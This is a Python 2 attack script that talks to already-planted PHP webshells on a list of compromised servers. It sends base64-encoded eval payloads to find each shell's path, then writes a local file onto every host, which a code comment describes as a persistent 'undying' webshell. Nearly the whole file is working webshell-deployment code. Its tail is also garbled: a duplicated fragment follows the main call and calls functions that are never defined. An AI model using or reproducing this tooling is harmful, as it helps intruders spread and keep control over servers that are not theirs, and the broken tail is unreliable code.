# coding=utf-8
# code from https://github.com/brianwrf/fileBatchUpload

import base64
import re
import requests

def exp(url,payload,type):
    if type=='post':
        try:
            req=requests.post(url,data=payload,timeout=3)
            print req
        except:
            pass
    elif type=='get':
        try:
            req=requests.get(url,params=payload,timeout=3)
            print req
        except:
            pass
    return req.status_code
    

def get_shell_path(posturl,passwd):
    data = {}
    data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
    shell_path = ""
    check=requests.get(posturl,timeout=3)
    if check.status_code==200:
        try:
            data[passwd] = '@eval(base64_decode($_POST[z0]));'
            shell_path = requests.post(posturl,data=data)
            flag=shell_path.text
            if flag!='':
                type='post'
        except:
            pass
        if flag=='':
            try:
                data[passwd] = '@eval(base64_decode($_GET[z0]));'
                shell_path=requests.get(posturl,params = data)
                flag=shell_path.text
                if flag!='':
                    type='get'
            except Exception:
                pass
    return shell_path.text,type



# 默认为auxi目录下的shell.php 不死马
def upload(localpath = 'shell.php'):
    print '\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'
    shellfile = 'webshell.txt'  # 存放webshell路径和密码的文件
    localfile = localpath  # 本地待上传的文件名
    flag = localfile.split('/')
    x = len(flag)
    filepath = flag[x - 1]
    shell_file = open(shellfile,'rb')
    local_content = str(open(localfile,'rb').read())
    for eachline in shell_file:
        posturl = eachline.split(',')[0].strip()
        passwd = eachline.split(',')[1].strip()
        print posturl,passwd
        try:
            reg = ".*/([^/]*\.php?)"
            match_shell_name = re.search(reg,eachline)
            if match_shell_name:
                shell_name = match_shell_name.group(1)
                print shell_name
                shell_path = get_shell_path(posturl,passwd)
                target_path = shell_path[0].split(shell_name)[0] + filepath
                target_path_base64 = base64.b64encode(target_path)
                target_file_url = eachline.split(shell_name)[0] + filepath
                print shell_path[1]
                data = {}
                if shell_path[1] == 'post':
                    data[passwd] = "@eval(base64_decode($_POST['z0']));"
                elif shell_path[1]=='get':
                    data[passwd] = "@eval(base64_decode($_GET['z0']));"
                else:
                    continue
                data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'
                data['z1'] = target_path_base64
                data['z2'] = base64.b64encode(local_content)
                print data
                response = exp(posturl,data,shell_path[1])
                print response
                if response==200:
                    check=requests.get(target_file_url,timeout=5)
                    print check
                    if check.status_code==200:
                        print '[+] ' + target_file_url + ', upload succeed!'
                    else:
                        print '[-] ' + target_file_url + ', upload failed!'
                else:
                    print '[-] ' + target_file_url + ', upload failed!'
            else:
                print '[-] ' + posturl + ', unsupported webshell!'
        except Exception,e:
            print '[-] ' + posturl + ', connection failed!'
            print e
    shell_file.close()

upload()
                response = post(posturl, data)
                if response:
                    print '[+] '+target_file_url+', upload succeed!'
                else:
                    print '[-] '+target_file_url+', upload failed!'
            else:
                print '[-] '+posturl+', unsupported webshell!'
        except Exception,e:
            print '[-] '+posturl+', connection failed!'
    shell_file.close()
  
if __name__ == '__main__':  
    main()  
